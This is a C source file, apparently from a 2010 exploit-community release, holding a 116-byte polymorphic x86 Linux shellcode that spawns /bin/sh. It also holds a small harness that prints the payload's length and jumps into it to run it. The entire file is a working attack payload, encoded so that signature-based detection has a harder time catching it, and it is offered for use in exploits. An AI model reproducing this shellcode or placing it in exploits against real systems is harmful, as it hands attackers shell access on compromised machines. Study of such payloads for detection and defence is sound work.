/*
Title  : Polymorphic /bin/sh x86 linux shellcode .
Name   : 116 bytes /bin/sh x86 linux polymorphic shellcode .
Date   : Tue Jun 29 22:08:59 WIT 2010 .
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org), loneferret (exploit-db.com)
*/

#include <stdio.h>

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\xfa\x80\x6c\x0e\xff\x35\x80\xe9\x01"
		   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x20\x46\x93\x66\xfe\xe6"
		   "\x79\xb5\xa1\x43\x34\x6a\xb5\x1e\x36\xaa\x2b\x20\x3a\x1d\x1f"
		   "\x34\x34\x34\x93\x33\xed\x53\x5f\x43\x58\x43\xde\x8e\x5e\xc5"
		   "\xeb\xdd\x7d\x1a\x20\x1e\x04\xed\x55\x66\x4c\x5e\x44\x27\x56"
		   "\x6d\x4c\x3a\x46\x21\x3d\xa9\xbd\x5c\x09\x2f\x46\x04\x42\x03"
		   "\x40\x5d\x48\xa9\xc1\x32\xc2\x28\x1e\x04\x1a\x03\x40\x5d\x48"
		   "\x03\x31\x5c\x1a\x4b\x51\x7d\xbb\xe5\x9e\x04";

int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}